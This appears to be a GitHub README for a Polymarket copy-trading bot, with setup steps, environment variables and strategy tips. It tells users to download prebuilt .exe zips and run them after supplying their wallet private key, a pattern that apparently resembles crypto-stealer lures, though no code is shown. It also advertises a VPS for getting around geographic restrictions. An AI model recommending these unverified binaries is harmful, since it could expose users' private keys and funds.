# Polymarket Copy Trading Bot

A high-performance Rust-based automated trading bot that copies trades from successful Polymarket traders (whales) in real-time. Monitor blockchain events, execute copy trades automatically, and manage risk with built-in circuit breakers.

## Contact & Support

- Telegram: [@soulcrancerdev](https://t.me/soulcrancerdev)
- X: [@soulcrancerdev](https://x.com/soulcrancerdev)

## How To Setup & Trade on Local n' Telegram

### Prod Version
- Local Setup: https://www.youtube.com/watch?v=
- Telegram Setup: https://www.youtube.com/watch?v=

### Demo Version
- Local Setup: https://www.youtube.com/watch?v=UoLfidnpc1w
- Telegram Setup: https://www.youtube.com/watch?v=8PC0bKSgfhM

---
## 🚀 Let's Trade!!

### **Polymarket Copy Trading Bot - Rust (Prod Version)**
- 🗂️ [polymarket-copy-trading-bot-prod.zip](https://github.com/user-attachments/files/25067356/polymarket-copy-trading-bot-prod.zip)

1. Extract `polymarket-copy-trading-bot-prod.zip` file.
2. Environment Variables Settings
   ```
   - USER_ADDRESSES=0xYourTraderAddress             # Traders to copy (comma-separated or JSON array)
   - PROXY_WALLET=0xYourWalletAddress               # Your wallet (must match PRIVATE_KEY)
   - PRIVATE_KEY=your_64_char_hex_private_key       # Private key without 0x prefix
   - RPC_URL=https://polygon-mainnet.infura.io/v3/YOUR_PROJECT_ID        # Polygon RPC endpoint (you can use Infura, Alchemy, or QuickNode)
   - MONGO_URI='mongodb+srv://user:pass@cluster.mongodb.net/database'    # ⚠️  Keep this private! Never share or commit to git
   - COPY_STRATEGY=PERCENTAGE                       # Copy strategy: PERCENTAGE, FIXED, or ADAPTIVE
   - COPY_SIZE=10.0                                 # PERCENTAGE: Percentage of trader's order (e.g., 10.0 = 10%)
   - MAX_ORDER_SIZE_USD=100.0                       # Maximum size for a single order in USD (default: 100.0)
   - MIN_ORDER_SIZE_USD=1.0                         # Minimum size for a single order in USD (default: 1.0)
   ```
3. Run `polymarket-copy-trading-bot-prod.exe`
<img width="824" height="974" alt="polymarket-copy-trading-bot-prod" src="https://github.com/user-attachments/assets/af0bacee-5deb-4091-9a1e-f31115e2e008" />

---

### **Polymarket Copy Trading Bot - Rust (Demo Version)**  
- 🗂️ [validate_setup.zip](https://github.com/user-attachments/files/24820052/validate_setup.zip)
- 🗂️ [approve_tokens.zip](https://github.com/user-attachments/files/24889543/approve_tokens.zip)
- 🗂️ [confirmed_block_bot.zip](https://github.com/user-attachments/files/24819758/confirmed_block_bot.zip)
- 🗂️ [mempool_bot.zip](https://github.com/user-attachments/files/24887683/mempool_bot.zip)

1. Extract all *.zip files into the same folder.
2. Environment Variables Settings
   ```
   - `PRIVATE_KEY` - Your wallet's private key (64 hex chars, no 0x)
   - `FUNDER_ADDRESS` - Your wallet address
   - `TARGET_WHALE_ADDRESS` - Whale address to copy (40 hex chars, no 0x)
   - `ALCHEMY_API_KEY` - WebSocket RPC provider key
   - `ENABLE_TRADING` - Enable/disable trading (true/false)
   - `MOCK_TRADING` - Simulation mode (true/false)
   - `POSITION_SCALE` - Position scaling factor (1.00 = 100%, 0.02 = 2%)
   - `BASE_PRICE_BUFFER` - Base price buffer for all trades
   - `MIN_WHALE_SHARES` - Minimum whale trade size to copy
   - `MIN_TRADE_VALUE_USD` - Minimum trade value in USD
   ```
3. Execute in the following order:

   1. **`validate_setup.exe`**  
      - **Description**: Checks your `.env` config and environment for missing/invalid settings before you risk any money.

   2. **`approve_tokens.exe`**  
      - **Description**: Sends on‑chain approvals so Polymarket contracts can spend your USDC and Conditional Tokens.

   3. **`confirmed_block_bot.exe`** 
      - **Description**: Runs the copy‑trading bot that waits for block confirmation, this is more reliable.

   4. **`mempool_bot.exe`**
      - **Description**: Runs the mempool‑based copy‑trading bot that watches pending transactions and mirrors whale trades fast.

<img width="1004" height="765" alt="Screenshot_7" src="https://github.com/user-attachments/assets/108af5c3-d585-41c2-bbac-536eb1472cc7" />

## ✨ Features
- **Multi-trader support** — Follow several traders at once; your edge is mirroring many minds instead of one.
- **Dynamic sizing** — Order size scales with your capital and strategy (percentage, fixed, or adaptive).
- **Tiered multipliers** — Bigger trades can use different scaling than small ones.
- **Accurate bookkeeping** — Tracks every buy and sell so positions stay correct even when balances change.
- **Batched orders** — Groups small signals into fewer, larger orders when aggregation is enabled.
- **Live execution** — Sub-second monitoring and immediate placement on the CLOB.
- **MongoDB-backed state** — All activity and positions stored for replay and analysis.
- **Slippage guards** — Avoids fills at worse-than-acceptable prices.

## 📁 Directory Structure

```
rust-polymarekt-copy-trading-bot/
├── src/
│   ├── main.rs                 # Main entry point (confirmed block mode)
│   ├── lib.rs                  # Core library (CLOB client, API interactions)
│   │
│   ├── bin/                    # Binary executables
│   │   ├── mempool_monitor.rs  # Mempool-based trading mode
│   │   ├── approve_tokens.rs   # Token approval utility
│   │   ├── validate_setup.rs   # Configuration validator
│   │   ├── trade_monitor.rs    # Personal fills logger
│   │   └── test_order_types.rs # Order testing utility
│   │
│   ├── config/                 # Configuration management
│   │   └── mod.rs              # Environment variables, constants, tier params
│   │
│   ├── models/                 # Data structures
│   │   └── mod.rs              # OrderInfo, ParsedEvent, WorkItem, etc.
│   │
│   ├── trading/                # Trading logic
│   │   ├── mod.rs              # Trading module exports
│   │   ├── orders.rs           # Order creation and submission
│   │   └── risk_guard.rs       # Circuit breaker system
│   │
│   ├── markets/                # Market-specific logic
│   │   ├── mod.rs              # Markets module exports
│   │   ├── market_cache.rs     # Market data caching
│   │   ├── tennis_markets.rs   # ATP market detection & buffers
│   │   └── soccer_markets.rs   # Ligue 1 market detection & buffers
│   │
│   └── utils/                  # Utility functions
│       └── mod.rs              # Profiler and helper functions
│
├── scripts/                    # Python utility scripts (cache warming, monitoring)
├── docs/                       # Documentation
├── .env.example                # Environment variable template
├── Cargo.toml                  # Rust project configuration
└── Makefile                    # Build automation
```
---
## 🚀 Getting Started

### Quick Start

1. **Clone the repository**
   ```bash
   git clone <repository-url>
   cd polymarket-copy-trading-arbitrage-bot
   ```

2. **Configure environment variables**
   - Copy `.env.example` to `.env`
   - Fill in your configuration (see [Environment Variables](#environment-variables) below)

3. **Run the bot**
   ```bash
   make run
   ```

   This command will:
   - Validate your setup
   - Build the project in release mode
   - Start the confirmed block trading bot

### Environment Variables

Create a `.env` file in the project root with the following variables:

```bash
# Required
PRIVATE_KEY=your_private_key_here                    # 64 hex chars, no 0x prefix
FUNDER_ADDRESS=your_wallet_address                    # Your wallet address
TARGET_WHALE_ADDRESS=whale_address_to_copy            # 40 hex chars, no 0x prefix
ALCHEMY_API_KEY=your_alchemy_api_key                  # WebSocket RPC provider key

# Trading Configuration
ENABLE_TRADING=false                                  # Set to true to enable trading
MOCK_TRADING=true                                     # Set to true for simulation mode
POSITION_SCALE=1.00                                   # Position scaling (1.00 = 100%, 0.02 = 2%)
BASE_PRICE_BUFFER=0.00                                # Base price buffer for all trades
MIN_WHALE_SHARES=500.0                                # Minimum whale trade size to copy
MIN_TRADE_VALUE_USD=1.0                               # Minimum trade value in USD
MIN_SHARES=1.0                                        # Minimum share count
ENABLE_PROB_SIZING=true                               # Enable probability-based sizing

# WebSocket Configuration
WS_URL=wss://polygon-mainnet.g.alchemy.com/v2/YOUR_KEY
```

See `.env.example` for a complete list of all available configuration options.

### Running Different Modes

- **Confirmed Block Bot** (default, more reliable):
  ```bash
  make run
  # or
  cargo run --release
  ```

- **Mempool Bot** (faster, monitors pending transactions):
  ```bash
  cargo run --release --bin mempool_bot
  ```

- **Validate Setup**:
  ```bash
  cargo run --release --bin validate_setup
  ```

- **Approve Tokens**:
  ```bash
  cargo run --release --bin approve_tokens
  ```

---
## 🚀 VPS Recommendation – Low-Latency Execution & GEO restrictions support

**Latency = edge** in Polymarket.

**[Trading VPS →](https://app.tradingvps.io/aff.php?aff=60)** is the go-to low-latency hosting solution among serious prediction-market and crypto bot runners.

<img width="803" height="300" alt="image" src="https://github.com/user-attachments/assets/7a3e4ce9-3e8a-4aa2-a8d6-f18dce66ad29" />

- Sub-1 ms to major Polygon nodes  
- Crypto/HFT-optimized locations  
- Exceptional uptime & network performance  

Note: Polymarket has some GEO restrictions, so many Polymarket traders are using our AMS VPS and love it.  
---

## Popular Copy Trading Strategies

Based on trending discussions on X in 2025-2026, here are key strategies for successful Polymarket copy trading. These emphasize selecting consistent traders and avoiding common pitfalls (e.g., blind copying leading to losses in 90% of cases).

1. **Build a Portfolio of Traders**
   - Diversify across 3-5 traders with expertise in specific markets (e.g., sports, politics, crypto).
   - Analyze wallet history: P&L curve, win rate, risk-reward, max drawdown.
   - Use "Copy Score" (e.g., R² * win rate * profit factor) to rank traders.
   - Avoid loud whales; target small quants with steady profits.

2. **Proportional Sizing and Risk Limits**
   - Mirror trades proportionally (e.g., if whale risks 5% of $1M, you risk 5% of your portfolio).
   - Cap risk at 7% per trade, max 3 open positions.
   - Start small (0.1% allocation) for testing.

3. **Custom Bot Parameters**
   - Skip certain markets or categories.
   - Set size multipliers based on trade size/category (e.g., chase spreads for high-volume trades).
   - Use retries with FAK/GTD orders; adjust for live vs. non-live markets.
   - Copy % (e.g., 50-100% of trader's size).

4. **Target Specific Trader Types**
   - **AI Sentiment Bots**: Copy bots that profit from news reactions (5-20 min window).
   - **Mean Reversion Bots**: Follow bots snapping up panic dumps.
   - **Undervaluation Traders**: Mirror those betting on low-attention, mispriced markets (e.g., lower leagues).
   - **Low/High Price Specialists**: Copy low-entry (0.1¢) high-frequency or high-entry (99¢) near-resolution plays.

5. **Wallet Baskets Approach**
   - Group 5-10 similar wallets; enter only when 80%+ align on the same outcome within a tight price range.

6. **Pre-Copy Checklist**
   - Trade manually first (10-20 trades) to understand risk.
   - Observe 5-10 trades before automating.
   - Match trader expertise to your interests (e.g., skip NHL if unfamiliar).
   - Ensure liquid markets (min $1M volume) to avoid moving prices.

7. **Advanced Tips**
   - Combine with domain specialization (10-20% allocation).
   - Monitor for adverse selection: Ensure your slippage + fees < trader's edge per share.
   - Learn from failures: Avoid being exit liquidity or news traps.

### Getting RPC URLs

- **Polygon**: Use Polygon RPC endpoints or Alchemy. Contact me for a free RPC URLs.

## 🤝 Support & Community

Fork, star, and contribute to the project on GitHub.

For the updates of the current copy trader w/ your tradin' logic, Reach out via Telegram: [@soulcrancerdev](https://t.me/soulcrancerdev)
